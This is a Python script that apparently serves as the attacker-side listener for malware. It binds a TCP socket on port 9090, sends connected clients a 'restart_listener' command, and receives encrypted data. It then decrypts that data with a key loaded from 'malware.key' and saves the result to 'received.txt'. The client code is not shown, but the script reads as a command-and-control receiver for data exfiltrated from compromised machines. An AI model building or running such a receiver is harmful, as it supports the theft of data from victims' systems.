import socket
from cryptography.fernet import Fernet
HOST = ''
PORT = 9090
FILE_NAME = 'received.txt'

def load_key():
    return open("malware.key", "rb").read()

#decrypt message
def decrypt_message(encrypted_message):
    key = load_key()
    f = Fernet(key)
    decrypted_message = f.decrypt(encrypted_message)
    return decrypted_message.decode()

def handle_client_connection(conn):
    received_data = conn.recv(1024).decode('utf-8')
    print(f"Received from client: {received_data}")

    response_message = 'restart_listener'
    conn.sendall(response_message.encode('utf-8'))
    print("Sent restart command to client.")

    #decrypt data
    encrypted_data = bytearray()
    while True:
        data = conn.recv(1024)
        if not data:
            break
        encrypted_data.extend(data)

    try:
        decrypted_data = decrypt_message(bytes(encrypted_data))
        with open(FILE_NAME, "w") as f:
            f.write(decrypted_data)
        print("Decrypted data")
    except Exception as e:
        print(f"Failed to decrypt data: {e}")


##sockets
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    print('Server listening... ')
    s.listen(1)

    while True:
        conn, addr = s.accept()
        print(f"Accepted new connection from: {addr}")

        with conn:
            handle_client_connection(conn)
